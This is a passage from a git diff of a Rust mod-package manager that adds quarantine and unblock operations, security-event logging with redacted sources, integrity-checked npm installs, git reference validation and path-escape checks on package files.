 +                Ok(resolved.locked)
 +            })
 +            .collect::<Result<Vec<_>>>()?;
@@ -68638,6 +69195,22 @@ index 000000000..f01f143c6
 +    ) -> Result<ModPackageLock> {
 +        let _guard = self.lock()?;
 +        self.recover_package_transaction()?;
++        let source = redacted_source(&request.source);
++        let result = self.package_apply_locked(request, confirmation);
++        if let Err(error) = &result {
++            let _ = self.record_security_event(
++                "package_refused",
++                json!({"source": source, "reason": error_code(error)}),
++            );
++        }
++        result
++    }
++
++    fn package_apply_locked(
++        &self,
++        request: ModInstallRequest,
++        confirmation: &str,
++    ) -> Result<ModPackageLock> {
 +        let plan = self.package_plan_locked(request, false)?;
 +        if plan.confirmation != confirmation {
 +            return Err(failure("package_plan_changed: preview again"));
@@ -68700,7 +69273,8 @@ index 000000000..f01f143c6
 +            .revision
 +            .checked_add(1)
 +            .ok_or_else(|| failure("revision_overflow"))?;
-+        self.commit_package_transaction(lock, config, &lifecycle)
++        let event = json!({"packages": plan.packages.iter().map(package_event).collect::<Vec<_>>()});
++        self.commit_package_transaction(lock, config, &lifecycle, &plan.action, event)
 +    }
 +
 +    pub fn package_uninstall_plan(&self, id: &str) -> Result<ModPackagePlan> {
@@ -68739,6 +69313,36 @@ index 000000000..f01f143c6
 +    }
 +
 +    pub fn package_disable(&self, id: &str) -> Result<ModPackageLock> {
++        self.package_disable_blocking(id, None)
++    }
++
++    /// Disables `id` and blocks its installed version so it cannot be enabled, reinstalled or rolled back to.
++    pub fn package_quarantine(&self, id: &str, reason: &str) -> Result<ModPackageLock> {
++        let reason = reason.trim();
++        if reason.is_empty() || reason.len() > 256 || reason.chars().any(char::is_control) {
++            return Err(failure("quarantine_reason_invalid: one line of 1 to 256 bytes"));
++        }
++        self.package_disable_blocking(id, Some(reason))
++    }
++
++    pub fn package_unblock(&self, id: &str) -> Result<ModPackageLock> {
++        let _guard = self.lock()?;
++        self.recover_package_transaction()?;
++        let mut lock = self.read_package_lock()?;
++        let before = lock.blocked.len();
++        lock.blocked.retain(|blocked| blocked.id != id);
++        if lock.blocked.len() == before {
++            return Err(failure("package_not_blocked"));
++        }
++        lock.revision = lock
++            .revision
++            .checked_add(1)
++            .ok_or_else(|| failure("revision_overflow"))?;
++        let config = self.configuration()?;
++        self.commit_package_transaction(lock, config, &[], "unblock", json!({"mod": id}))
++    }
++
++    fn package_disable_blocking(&self, id: &str, block: Option<&str>) -> Result<ModPackageLock> {
 +        let _guard = self.lock()?;
 +        self.recover_package_transaction()?;
 +        let mut lock = self.read_package_lock()?;
@@ -68749,6 +69353,19 @@ index 000000000..f01f143c6
 +        package.enabled = false;
 +        let path = package.path.clone();
 +        let scope = package.scope.clone();
++        let event = package_event(package);
++        if let Some(reason) = block {
++            let blocked = ModBlockedPackage {
++                id: id.to_owned(),
++                version: package.version.clone(),
++                integrity: package.integrity.clone(),
++                reason: reason.to_owned(),
++            };
++            lock.blocked.retain(|existing| {
++                !(existing.id == blocked.id && existing.integrity == blocked.integrity)
++            });
++            lock.blocked.push(blocked);
++        }
 +        lock.revision = lock
 +            .revision
 +            .checked_add(1)
@@ -68764,13 +69381,35 @@ index 000000000..f01f143c6
 +            .revision
 +            .checked_add(1)
 +            .ok_or_else(|| failure("revision_overflow"))?;
-+        self.commit_package_transaction(lock, config, &[])
++        match block {
++            Some(reason) => self.commit_package_transaction(
++                lock,
++                config,
++                &[],
++                "quarantine",
++                json!({"package": event, "reason": reason}),
++            ),
++            None => self.commit_package_transaction(
++                lock,
++                config,
++                &[],
++                "disable",
++                json!({"package": event}),
++            ),
++        }
 +    }
 +
 +    pub fn package_enable(&self, id: &str) -> Result<ModPackageLock> {
 +        let _guard = self.lock()?;
 +        self.recover_package_transaction()?;
 +        let mut lock = self.read_package_lock()?;
++        let blocked = lock.packages.get(id).and_then(|package| {
++            lock.blocked_reason(id, &package.version, &package.integrity)
++                .map(str::to_owned)
++        });
++        if let Some(reason) = blocked {
++            return Err(failure(format!("package_blocked: {id}: {reason}")));
++        }
 +        let package = lock
 +            .packages
 +            .get_mut(id)
@@ -68818,7 +69457,8 @@ index 000000000..f01f143c6
 +            .revision
 +            .checked_add(1)
 +            .ok_or_else(|| failure("revision_overflow"))?;
-+        self.commit_package_transaction(lock, config, &[])
++        let event = json!({"package": package_event(&lock.packages[id])});
++        self.commit_package_transaction(lock, config, &[], "enable", event)
 +    }
 +
 +    pub fn package_uninstall(&self, id: &str, confirmation: &str) -> Result<ModPackageLock> {
@@ -68848,7 +69488,8 @@ index 000000000..f01f143c6
 +            .revision
 +            .checked_add(1)
 +            .ok_or_else(|| failure("revision_overflow"))?;
-+        self.commit_package_transaction(lock, config, &[])
++        let event = json!({"package": package_event(&package)});
++        self.commit_package_transaction(lock, config, &[], "uninstall", event)
 +    }
 +
 +    pub fn package_rollback_plan(&self, id: &str) -> Result<ModPackagePlan> {
@@ -68869,6 +69510,12 @@ index 000000000..f01f143c6
 +            .and_then(|history| history.last())
 +            .cloned()
 +            .ok_or_else(|| failure("package_rollback_unavailable"))?;
++        if let Some(reason) = lock.blocked_reason(id, &previous.version, &previous.integrity) {
++            return Err(failure(format!(
++                "package_blocked: {id} {}: {reason}",
++                previous.version
++            )));
++        }
 +        let mut plan = ModPackagePlan {
 +            schema: PACKAGE_LOCK_SCHEMA,
 +            action: "rollback".into(),
@@ -68935,15 +69582,18 @@ index 000000000..f01f143c6
 +            .revision
 +            .checked_add(1)
 +            .ok_or_else(|| failure("revision_overflow"))?;
-+        self.commit_package_transaction(lock, config, &[])
++        let event = json!({"package": package_event(&plan.packages[0])});
++        self.commit_package_transaction(lock, config, &[], "rollback", event)
 +    }
 +
 +    /// Runs `lifecycle` scripts and restores the previous lock and configuration on failure.
-+    fn commit_package_transaction(
++    pub(super) fn commit_package_transaction(
 +        &self,
 +        lock: ModPackageLock,
 +        config: ModConfiguration,
 +        lifecycle: &[(ModLockedPackage, &str)],
++        event: &str,
++        detail: Value,
 +    ) -> Result<ModPackageLock> {
 +        let old_lock = serde_json::to_value(self.read_package_lock()?)?;
 +        let old_config = serde_json::to_value(self.configuration()?)?;
@@ -68951,7 +69601,7 @@ index 000000000..f01f143c6
 +            "package-transaction.json",
 +            &json!({"old_lock":old_lock,"old_config":old_config}),
 +        )?;
-+        let result = (|| {
++        let result: Result<ModPackageLock> = (|| {
 +            for (package, event) in lifecycle {
 +                self.run_lifecycle(package, event)?;
 +            }
@@ -68976,7 +69626,9 @@ index 000000000..f01f143c6
 +        if result.is_err() {
 +            self.recover_package_transaction()?;
 +        }
-+        result
++        let lock = result?;
++        let _ = self.record_security_event(event, detail);
++        Ok(lock)
 +    }
 +
 +    pub(super) fn recover_package_transaction(&self) -> Result<()> {
@@ -69010,6 +69662,36 @@ index 000000000..f01f143c6
 +    ) -> Result<ResolvedPackage> {
 +        let (path, normalized_source, expected_integrity) =
 +            self.materialize_source(source, request.offline)?;
++        let staged =
++            path.starts_with(&self.root) && !path.starts_with(self.root.join("package-cache"));
++        let result = self.resolve_materialized(
++            path.clone(),
++            normalized_source,
++            expected_integrity,
++            requirement,
++            request,
++            resolved,
++            visiting,
++            inspect,
++        );
++        if result.is_err() && staged {
++            let _ = std::fs::remove_dir_all(&path);
++        }
++        result
++    }
++
++    #[allow(clippy::too_many_arguments)]
++    fn resolve_materialized(
++        &self,
++        path: PathBuf,
++        normalized_source: ModPackageSource,
++        expected_integrity: Option<String>,
++        requirement: Option<(&str, &str)>,
++        request: &ModInstallRequest,
++        resolved: &mut BTreeMap<String, ResolvedPackage>,
++        visiting: &mut Vec<String>,
++        inspect: bool,
++    ) -> Result<ResolvedPackage> {
 +        let (package, _, integrity) = store::package(&path)?;
 +        if let Some(expected) = expected_integrity
 +            && expected != integrity
@@ -69099,6 +69781,10 @@ index 000000000..f01f143c6
 +            state_version: package.state_version,
 +            dependencies: package.dependencies.clone(),
 +            capabilities: package.capabilities.clone(),
++            authority: json!({"exposure":authority_exposure(&package.capabilities),
++                "os_access":package.os_access,"approves":package.approves,"http_access":package.http_access,
++                "fs_access":package.fs_access,"mcp_servers":package.mcp_servers,"policy":package.policy,
++                "peer_access":package.peer_access,"autonomy":package.autonomy}),
 +            exec_environment: package.exec_environment.clone(),
 +            settings_schema_sha256: digest(
 +                &serde_json::to_vec(&package.settings_schema).unwrap_or_default(),
@@ -69155,13 +69841,15 @@ index 000000000..f01f143c6
 +                revision,
 +                subdirectory,
 +            } => {
-+                if revision.len() != 40
-+                    || !revision.bytes().all(|byte| byte.is_ascii_hexdigit())
++                let commit =
++                    revision.len() == 40 && revision.bytes().all(|byte| byte.is_ascii_hexdigit());
++                if !(commit || git_reference(revision))
 +                    || repository.is_empty()
 +                    || repository.len() > 2048
++                    || repository.starts_with('-')
 +                    || !package_directory(subdirectory)
 +                {
-+                    return Err(failure("immutable_repository_revision_required"));
++                    return Err(failure("repository_reference_invalid"));
 +                }
 +                let local = PathBuf::from(repository);
 +                let (repository_path, repository_source) = if local.exists() {
@@ -69169,6 +69857,11 @@ index 000000000..f01f143c6
 +                    let source = path.display().to_string();
 +                    (path, source)
 +                } else {
++                    if offline && !commit {
++                        return Err(failure(
++                            "repository_reference_requires_network: pin a commit for offline installs",
++                        ));
++                    }
 +                    if offline
 +                        && let Some(package) =
 +                            self.read_package_lock()?.packages.values().find(|package| {
@@ -69230,7 +69923,21 @@ index 000000000..f01f143c6
 +                    }
 +                    (cached.canonicalize()?, repository.clone())
 +                };
-+                let revision = revision.to_lowercase();
++                let revision = if commit {
++                    revision.to_lowercase()
++                } else {
++                    let target = if local.exists() {
++                        format!("{revision}^{{commit}}")
++                    } else {
++                        "FETCH_HEAD^{commit}".to_owned()
++                    };
++                    git(
++                        &repository_path,
++                        &["rev-parse", "--verify", "--end-of-options", &target],
++                    )?
++                    .trim()
++                    .to_owned()
++                };
 +                let actual = git(
 +                    &repository_path,
 +                    &["rev-parse", &format!("{revision}^{{commit}}")],
@@ -69299,7 +70006,7 @@ index 000000000..f01f143c6
 +                                matches!(&package.source,
 +                                    ModPackageSource::Package { index: locked_index, id: locked_id, version: locked_version }
 +                                    if locked_index == index && locked_id == id
-+                                        && service_version_satisfies(version, locked_version))
++                                        && release_matches(version, locked_version))
 +                                    && package.cache_path.exists()
 +                            })
 +                        {
@@ -69313,24 +70020,24 @@ index 000000000..f01f143c6
 +                    }
 +                    Err(error) => return Err(error),
 +                };
-+                let index_value: PackageIndex =
-+                    serde_json::from_slice(&store::read(&index_path, 524_288)?)?;
-+                if index_value.schema != 1 {
-+                    return Err(failure("unsupported_package_index_schema"));
-+                }
++                let index_value = read_index(&index_path)?;
 +                let releases = index_value
 +                    .packages
 +                    .get(id)
 +                    .ok_or_else(|| failure("package_unavailable"))?;
-+                let release = releases
++                let candidates = releases
 +                    .iter()
-+                    .filter_map(|release| {
-+                        service_version_satisfies(version, &release.version)
-+                            .then_some((SemanticVersion::parse(&release.version)?, release))
-+                    })
-+                    .max_by_key(|(version, _)| *version)
-+                    .map(|(_, release)| release)
-+                    .ok_or_else(|| failure("package_version_unavailable"))?;
++                    .filter(|release| release_matches(version, &release.version));
++                let release = candidates
++                    .clone()
++                    .filter(|release| release.blocked.is_none())
++                    .max_by_key(|release| SemanticVersion::parse(&release.version))
++                    .ok_or_else(|| {
++                        match candidates.filter_map(|release| release.blocked.as_deref()).next() {
++                            Some(reason) => failure(format!("package_version_blocked: {reason}")),
++                            None => failure("package_version_unavailable"),
++                        }
++                    })?;
 +                let (path, resolved, actual_expected) =
 +                    self.materialize_source(&release.source, offline)?;
 +                if actual_expected
@@ -69350,7 +70057,174 @@ index 000000000..f01f143c6
 +                    Some(release.integrity.clone()),
 +                ))
 +            }
++            ModPackageSource::Npm {
++                package,
++                version,
++                registry,
++                integrity,
++            } => self.materialize_npm(package, version, registry, integrity, offline),
 +        }
++    }
++
++    fn materialize_npm(
++        &self,
++        package: &str,
++        requirement: &str,
++        registry: &str,
++        pinned: &str,
++        offline: bool,
++    ) -> Result<(PathBuf, ModPackageSource, Option<String>)> {
++        let config = NpmConfig::load();
++        let registry = if registry.is_empty() {
++            config.registry(package)
++        } else {
++            registry.trim_end_matches('/').to_owned()
++        };
++        let registry = registry.as_str();
++        if !npm_name(package)
++            || !version_selector(requirement)
++            || !npm_url(registry)
++            || !(pinned.is_empty() || pinned.starts_with("sha512-"))
++        {
++            return Err(failure("npm_reference_invalid"));
++        }
++        if offline {
++            let lock = self.read_package_lock()?;
++            let package = lock
++                .packages
++                .values()
++                .chain(lock.history.values().flatten())
++                .find(|locked| {
++                    matches!(&locked.source, ModPackageSource::Npm {
++                        package: name, version, registry: origin, integrity }
++                        if name == package && origin == registry
++                            && (pinned.is_empty() || pinned == integrity)
++                            && release_matches(requirement, version))
++                        && locked.cache_path.exists()
++                })
++                .ok_or_else(|| failure("npm_package_unavailable_offline_and_not_cached"))?;
++            return Ok((
++                package.cache_path.canonicalize()?,
++                package.source.clone(),
++                Some(package.integrity.clone()),
++            ));
++        }
++        let metadata_url = format!("{registry}/{}", package.replace('/', "%2f"));
++        let metadata: Value = serde_json::from_slice(&npm_fetch(
++            &metadata_url,
++            NPM_METADATA_LIMIT,
++            "application/vnd.npm.install-v1+json",
++            config.token(&metadata_url),
++        )?)
++        .map_err(|_| failure("npm_metadata_invalid"))?;
++        let exact = if requirement.is_empty() {
++            metadata["dist-tags"]["latest"]
++                .as_str()
++                .ok_or_else(|| failure("npm_version_unavailable"))?
++                .to_owned()
++        } else {
++            metadata["versions"]
++                .as_object()
++                .into_iter()
++                .flatten()
++                .map(|(version, _)| version)
++                .filter(|version| release_matches(requirement, version))
++                .max_by_key(|version| SemanticVersion::parse(version))
++                .cloned()
++                .ok_or_else(|| failure("npm_version_unavailable"))?
++        };
++        let dist = &metadata["versions"][&exact]["dist"];
++        let tarball = dist["tarball"]
++            .as_str()
++            .filter(|tarball| npm_url(tarball))
++            .ok_or_else(|| failure("npm_tarball_unavailable"))?;
++        let expected = dist["integrity"]
++            .as_str()
++            .and_then(|value| value.split_whitespace().find(|hash| hash.starts_with("sha512-")))
++            .ok_or_else(|| failure("npm_integrity_required: the registry lists no sha512 integrity"))?
++            .to_owned();
++        if !pinned.is_empty() && pinned != expected {
++            return Err(failure("npm_integrity_changed: the registry now serves different content"));
++        }
++        let staging = self.root.join(format!(
++            ".npm-{}.{}.tmp",
++            &digest(expected.as_bytes())[..12],
++            std::process::id()
++        ));
++        if staging.exists() {
++            return Err(failure("stale_npm_staging_directory"));
++        }
++        std::fs::create_dir(&staging)?;
++        let result = (|| {
++            let archive = npm_fetch(
++                tarball,
++                NPM_TARBALL_LIMIT,
++                "application/octet-stream",
++                config.token(tarball),
++            )?;
++            if npm_integrity(&archive) != expected {
++                return Err(failure("npm_tarball_integrity_failure"));
++            }
++            let archive_path = self.root.join(format!(".npm-{}.{}.tgz", &digest(expected.as_bytes())[..12], std::process::id()));
++            std::fs::write(&archive_path, &archive)?;
++            let files = npm_archive_files(&archive_path);
++            let _ = std::fs::remove_file(&archive_path);
++            let files = files?;
++            let manifest: Value = serde_json::from_slice(
++                files
++                    .get("package.json")
++                    .ok_or_else(|| failure("npm_package_json_missing"))?,
++            )
++            .map_err(|_| failure("npm_package_json_invalid"))?;
++            if manifest["name"] != package || manifest["version"] != exact.as_str() {
++                return Err(failure("npm_package_identity_mismatch"));
++            }
++            if manifest["dependencies"]
++                .as_object()
++                .is_some_and(|dependencies| !dependencies.is_empty())
++            {
++                return Err(failure(
++                    "npm_runtime_dependencies_unsupported: bundle dependencies into the mod entrypoint",
++                ));
++            }
++            let mod_manifest = files
++                .get("mod.json")
++                .ok_or_else(|| failure("npm_mod_manifest_missing: publish mod.json in the package"))?;
++            let mod_package: ModPackage = serde_json::from_slice(mod_manifest)?;
++            mod_package.validate()?;
++            if mod_package.version != exact {
++                return Err(failure("npm_mod_version_mismatch: mod.json and package.json versions differ"));
++            }
++            for relative in std::iter::once("mod.json")
++                .chain(std::iter::once(mod_package.entrypoint.as_str()))
++                .chain(mod_package.lifecycle.values().map(String::as_str))
++                .chain(mod_package.assets.iter().map(String::as_str))
++            {
++                let bytes = files
++                    .get(relative)
++                    .ok_or_else(|| failure(format!("npm_package_file_missing: {relative}")))?;
++                let target = staging.join(relative);
++                if let Some(parent) = target.parent() {
++                    std::fs::create_dir_all(parent)?;
++                }
++                std::fs::write(target, bytes)?;
++            }
++            Ok(())
++        })();
++        if let Err(error) = result {
++            let _ = std::fs::remove_dir_all(&staging);
++            return Err(error);
++        }
++        Ok((
++            staging,
++            ModPackageSource::Npm {
++                package: package.to_owned(),
++                version: exact,
++                registry: registry.to_owned(),
++                integrity: expected,
++            },
++            None,
++        ))
 +    }
 +
 +    fn cache_package(
@@ -69403,6 +70277,9 @@ index 000000000..f01f143c6
 +            .iter()
 +            .any(|trusted| trusted == event)
 +        {
++            if event == "uninstall" {
++                return Ok(());
++            }
 +            return Err(failure("lifecycle_script_not_trusted"));
 +        }
 +        let inspected = store::package(&package.path);
@@ -69421,7 +70298,7 @@ index 000000000..f01f143c6
 +            .get(event)
 +            .ok_or_else(|| failure("lifecycle_script_missing"))?;
 +        let source =
-+            String::from_utf8(store::read(&package.path.join(script), 65_536)?).map_err(failure)?;
++            String::from_utf8(store::package_read(&package.path, script, 65_536)?).map_err(failure)?;
 +        let node = self.configuration()?.node;
 +        let request = json!({"source":source,"filename":script,"adapter":null,"event":"inspect",
 +            "name":event,"payload":null,"state":null,"settings":{"event":event,"package":package.id,
@@ -69434,12 +70311,16 @@ index 000000000..f01f143c6
 +            &|| true,
 +            &mut |_| Err(failure("host_operation_unavailable")),
 +        )?;
++        let _ = self.record_security_event(
++            "lifecycle",
++            json!({"package": package_event(package), "script": event}),
++        );
 +        Ok(())
 +    }
 +}
 +
 +fn copy_file(source: &Path, destination: &Path, relative: &str, limit: u64) -> Result<()> {
-+    let bytes = store::read(&source.join(relative), limit)?;
++    let bytes = store::package_read(source, relative, limit)?;
 +    let target = destination.join(relative);
 +    if let Some(parent) = target.parent() {
 +        std::fs::create_dir_all(parent)?;
@@ -69475,6 +70356,316 @@ index 000000000..f01f143c6
 +        return Err(failure("repository_provenance_mismatch"));
 +    }
 +    Ok(())
++}
++
++fn package_event(package: &ModLockedPackage) -> Value {
++    json!({"id": package.id, "version": package.version, "integrity": package.integrity,
++        "scope": package.scope, "source": redacted_source(&package.source),
++        "capabilities": package.trust.capabilities, "enabled": package.enabled})
++}
++
++pub(super) fn redacted_source(source: &ModPackageSource) -> Value {
++    let url = |value: &str| {
++        let value = value.split(['?', '#']).next().unwrap_or_default();
++        match value.split_once("://") {
++            Some((scheme, rest)) => format!(
++                "{scheme}://{}",
++                rest.rsplit_once('@')
++                    .filter(|(userinfo, _)| !userinfo.contains('/'))
++                    .map_or(rest, |(_, host)| host)
++            ),
++            None => value.to_owned(),
++        }
++    };
++    match source {
++        ModPackageSource::Repository {
++            repository,
++            revision,
++            subdirectory,
++        } => json!({"kind": "repository", "repository": url(repository), "revision": revision,
++            "subdirectory": subdirectory}),
++        ModPackageSource::Npm {
++            package,
++            version,
++            registry,
++            integrity,
++        } => json!({"kind": "npm", "package": package, "version": version,
++            "registry": url(registry), "integrity": integrity}),
++        source => json!(source),
++    }
++}
++
++pub(super) fn error_code(error: &io::Error) -> String {
++    let message = error.to_string();
++    message
++        .split(':')
++        .next()
++        .unwrap_or_default()
++        .chars()
++        .take(96)
++        .collect()
++}
++
++fn same_origin(previous: &ModPackageSource, next: &ModPackageSource) -> bool {
++    match (previous, next) {
++        (ModPackageSource::Local { path: a }, ModPackageSource::Local { path: b }) => a == b,
++        (
++            ModPackageSource::Repository {
++                repository: a,
++                subdirectory: c,
++                ..
++            },
++            ModPackageSource::Repository {
++                repository: b,
++                subdirectory: d,
++                ..
++            },
++        ) => a == b && c == d,
++        (
++            ModPackageSource::Package {
++                index: a, id: c, ..
++            },
++            ModPackageSource::Package {
++                index: b, id: d, ..
++            },
++        ) => a == b && c == d,
++        (
++            ModPackageSource::Npm {
++                package: a,
++                registry: c,
++                ..
++            },
++            ModPackageSource::Npm {
++                package: b,
++                registry: d,
++                ..
++            },
++        ) => a == b && c == d,
++        _ => false,
++    }
++}
++
++fn release_matches(requirement: &str, version: &str) -> bool {
++    requirement.is_empty()
++        || requirement == version
++        || service_version_satisfies(requirement, version)
++}
++
++fn version_selector(value: &str) -> bool {
++    value.is_empty()
++        || (value.len() <= 64
++            && value
++                .bytes()
++                .all(|byte| byte.is_ascii_alphanumeric() || matches!(byte, b'.' | b'-' | b'+' | b'^')))
++}
++
++fn git_reference(value: &str) -> bool {
++    !value.is_empty()
++        && value.len() <= 256
++        && !value.starts_with(['-', '/', '.'])
++        && !value.ends_with(['/', '.'])
++        && !value.contains("..")
++        && !value.contains("//")
++        && !value.ends_with(".lock")
++        && value
++            .bytes()
++            .all(|byte| byte.is_ascii_alphanumeric() || matches!(byte, b'-' | b'_' | b'.' | b'/'))
++}
++
++fn npm_name(value: &str) -> bool {
++    let name = |part: &str| {
++        !part.is_empty()
++            && !part.starts_with(['.', '_'])
++            && part.bytes().all(|byte| {
++                byte.is_ascii_lowercase()
++                    || byte.is_ascii_digit()
++                    || matches!(byte, b'-' | b'.' | b'_' | b'~')
++            })
++    };
++    value.len() <= 214
++        && match value.strip_prefix('@').map(|rest| rest.split_once('/')) {
++            Some(Some((scope, package))) => name(scope) && name(package),
++            Some(None) => false,
++            None => name(value),
++        }
++}
++
++fn npm_url(value: &str) -> bool {
++    value.len() <= 2048
++        && !value.chars().any(|character| character.is_whitespace() || character.is_control())
++        && (value.starts_with("https://")
++            || ["http://127.0.0.1:", "http://localhost:", "http://[::1]:"]
++                .iter()
++                .any(|prefix| value.starts_with(prefix)))
++}
++
++fn npm_integrity(bytes: &[u8]) -> String {
++    use base64::Engine;
++    format!(
++        "sha512-{}",
++        base64::engine::general_purpose::STANDARD.encode(sha2::Sha512::digest(bytes))
++    )
++}
++
++/// Runs `command` with `input` on stdin and returns at most `limit` bytes of its standard output.
++fn bounded_output(
++    command: &mut Command,
++    input: Option<String>,
++    limit: usize,
++    code: &str,
++) -> Result<Vec<u8>> {
++    let mut child = command
++        .stdin(if input.is_some() {
++            std::process::Stdio::piped()
++        } else {
++            std::process::Stdio::null()
++        })
++        .stdout(std::process::Stdio::piped())
++        .stderr(std::process::Stdio::piped())
++        .spawn()?;
++    if let (Some(input), Some(mut stdin)) = (input, child.stdin.take()) {
++        std::io::Write::write_all(&mut stdin, input.as_bytes())?;
++    }
++    let mut bytes = Vec::new();
++    child
++        .stdout
++        .take()
++        .ok_or_else(|| failure(code))?
++        .take(limit as u64 + 1)
++        .read_to_end(&mut bytes)?;
++    if bytes.len() > limit {
++        let _ = child.kill();
++        let _ = child.wait();
++        return Err(failure(format!("{code}: larger than {limit} bytes")));
++    }
++    let output = child.wait_with_output()?;
++    if !output.status.success() {
++        return Err(failure(format!(
++            "{code}: {}",
++            String::from_utf8_lossy(&output.stderr)
++                .trim()
++                .chars()
++                .take(256)
++                .collect::<String>()
++        )));
++    }
++    Ok(bytes)
++}
++
++fn npm_fetch(url: &str, limit: usize, accept: &str, token: Option<&str>) -> Result<Vec<u8>> {
++    if token.is_some_and(|token| token.chars().any(|character| character == '"' || character == '\\' || character.is_control())) {
++        return Err(failure("npm_token_invalid: check _authToken in .npmrc"));
++    }
++    let mut command = Command::new("/usr/bin/curl");
++    command.env_clear().env("PATH", "/usr/bin:/bin").envs(
++        ["HTTPS_PROXY", "https_proxy", "HTTP_PROXY", "http_proxy", "ALL_PROXY", "all_proxy", "NO_PROXY", "no_proxy"]
++            .iter()
++            .filter_map(|name| Some((*name, std::env::var_os(name)?))),
++    );
++    if token.is_some() {
++        command.args(["--config", "-"]);
++    }
++    bounded_output(
++        command
++            .args([
++                "--silent",
++                "--show-error",
++                "--fail",
++                "--location",
++                "--max-redirs",
++                "3",
++                "--proto",
++                "=https,http",
++                "--proto-redir",
++                "=https",
++                "--connect-timeout",
++                "20",
++                "--max-time",
++                "120",
++                "--header",
++            ])
++            .arg(format!("Accept: {accept}"))
++            .arg(url),
++        token.map(|token| format!("header = \"Authorization: Bearer {token}\"\n")),
++        limit,
++        "npm_fetch_failed",
++    )
++}
++
++/// Reads the regular files of an npm tarball, stripping its top-level directory.
++fn npm_archive_files(archive: &Path) -> Result<BTreeMap<String, Vec<u8>>> {
++    let tar = bounded_output(
++        Command::new("/usr/bin/gzip")
++            .env_clear()
++            .env("PATH", "/usr/bin:/bin")
++            .arg("-dc")
++            .arg(archive),
++        None,
++        NPM_UNPACKED_LIMIT,
++        "npm_archive_invalid",
++    )?;
++    let field = |bytes: &[u8]| {
++        String::from_utf8_lossy(&bytes[..bytes.iter().position(|byte| *byte == 0).unwrap_or(bytes.len())])
++            .into_owned()
++    };
++    let mut files = BTreeMap::new();
++    let mut offset = 0;
++    let mut long_name = None;
++    while offset + 512 <= tar.len() {
++        let header = &tar[offset..offset + 512];
++        if header.iter().all(|byte| *byte == 0) {
++            break;
++        }
++        let size = usize::from_str_radix(field(&header[124..136]).trim(), 8)
++            .map_err(|_| failure("npm_archive_invalid: entry size"))?;
++        let start = offset + 512;
++        let end = start
++            .checked_add(size)
++            .filter(|end| *end <= tar.len())
++            .ok_or_else(|| failure("npm_archive_invalid: truncated"))?;
++        let data = &tar[start..end];
++        offset = start + size.div_ceil(512) * 512;
++        let name = long_name.take().unwrap_or_else(|| {
++            let prefix = field(&header[345..500]);
++            let name = field(&header[..100]);
++            if prefix.is_empty() {
++                name
++            } else {
++                format!("{prefix}/{name}")
++            }
++        });
++        match header[156] {
++            b'x' => {
++                long_name = String::from_utf8_lossy(data).lines().find_map(|record| {
++                    record
++                        .split_once(' ')
++                        .and_then(|(_, record)| record.strip_prefix("path="))
++                        .map(str::to_owned)
++                });
++                continue;
++            }
++            b'L' => {
++                long_name = Some(field(data));
++                continue;
++            }
++            b'g' | b'5' => continue,
++            b'0' | 0 => {}
++            _ => return Err(failure(format!("npm_archive_link_rejected: {name}"))),
++        }
++        let relative = name
++            .split_once('/')
++            .map(|(_, relative)| relative)
++            .filter(|relative| {
++                relative.split('/').all(|part| !part.is_empty() && part != "." && part != "..")
++            })
++            .ok_or_else(|| failure(format!("npm_archive_path_rejected: {name}")))?;
++        if files.len() >= NPM_ARCHIVE_ENTRIES
++            || files.insert(relative.to_owned(), data.to_vec()).is_some()
++        {
++            return Err(failure("npm_archive_invalid: too many or duplicate entries"));
++        }
++    }
++    Ok(files)
 +}
 +
 +fn package_directory(value: &str) -> bool {
@@ -69570,6 +70761,10 @@ index 000000000..f01f143c6
 +                "migration_required":previous.is_some_and(|value|value.state_version != package.state_version) && !package.enabled},
 +            "dependencies":{"from":previous.map(|value|&value.dependencies),"to":package.dependencies},
 +            "capabilities":{"from":previous.map(|value|&value.capabilities),"to":package.capabilities},
++            "authority":{"from":previous.map(|value|&value.authority),"to":package.authority},
++            "grant":{"from":previous.map(|value|&value.trust),"to":package.trust},
++            "renewed_approval":previous.is_none_or(|value|value.trust != package.trust
++                || value.authority != package.authority || !same_origin(&value.source, &package.source)),
 +            "exec_environment":{"from":previous.map(|value|&value.exec_environment),"to":package.exec_environment},
 +            "secret_environment":{"from":previous.map(|value|&value.trust.secret_environment),"to":package.trust.secret_environment},
 +            "settings_schema_sha256":{"from":previous.map(|value|&value.settings_schema_sha256),"to":package.settings_schema_sha256},
@@ -69588,8 +70783,10 @@ index 000000000..f01f143c6
 +        ),
 +        ("local_sources_preserved".to_owned(), Value::Bool(true)),
 +        (
-+            "activation_requires_confirmation".to_owned(),
-+            Value::Bool(true),
++            "activation".to_owned(),
++            json!(
++                "installing never enables a package; an update keeps a package on only when its grant, authority and origin are unchanged"
++            ),
 +        ),
 +    ]))
 +}
@@ -71400,10 +72597,10 @@ index 000000000..67ab2eb55
 +}
 diff --git a/codex-rs/omd/src/mods/store.rs b/codex-rs/omd/src/mods/store.rs
 new file mode 100644
-index 000000000..4cf6e15c3
+index 000000000..be9e86ecd
 --- /dev/null
 +++ b/codex-rs/omd/src/mods/store.rs
-@@ -0,0 +1,752 @@
+@@ -0,0 +1,846 @@
 +use super::ModConfiguration;
 +use super::ModPackage;
 +use super::ModSelection;
@@ -71476,6 +72673,19 @@ index 000000000..4cf6e15c3
 +    Ok(bytes)
 +}
 +
++pub(super) fn package_read(root: &Path, relative: &str, limit: u64) -> Result<Vec<u8>> {
++    let path = root.join(relative);
++    if !path
++        .parent()
++        .ok_or_else(|| failure("package_path_escape"))?
++        .canonicalize()?
++        .starts_with(root)
++    {
++        return Err(failure(format!("package_path_escape: {relative}")));
++    }
++    read(&path, limit)
++}
++
 +pub(super) fn package(path: &Path) -> Result<(ModPackage, String, String)> {
 +    let (package, source, hash, _) = package_with_assets(path)?;
 +    Ok((package, source, hash))
@@ -71490,7 +72700,7 @@ index 000000000..4cf6e15c3
 +    let manifest = read(&path.join("mod.json"), 8192)?;
 +    let package: ModPackage = serde_json::from_slice(&manifest)?;
 +    package.validate()?;
-+    let source = read(&path.join(&package.entrypoint), 65_536)?;
++    let source = package_read(path, &package.entrypoint, 65_536)?;
 +    let mut bytes = manifest;
 +    bytes.push(0);
 +    bytes.extend_from_slice(package.entrypoint.as_bytes());
@@ -71502,11 +72712,11 @@ index 000000000..4cf6e15c3
 +        bytes.push(0);
 +        bytes.extend_from_slice(script.as_bytes());
 +        bytes.push(0);
-+        bytes.extend_from_slice(&read(&path.join(script), 65_536)?);
++        bytes.extend_from_slice(&package_read(path, script, 65_536)?);
 +    }
 +    let mut assets = BTreeMap::new();
 +    for asset in &package.assets {
-+        let content = read(&path.join(asset), 65_536)?;
++        let content = package_read(path, asset, 65_536)?;
 +        bytes.push(0);
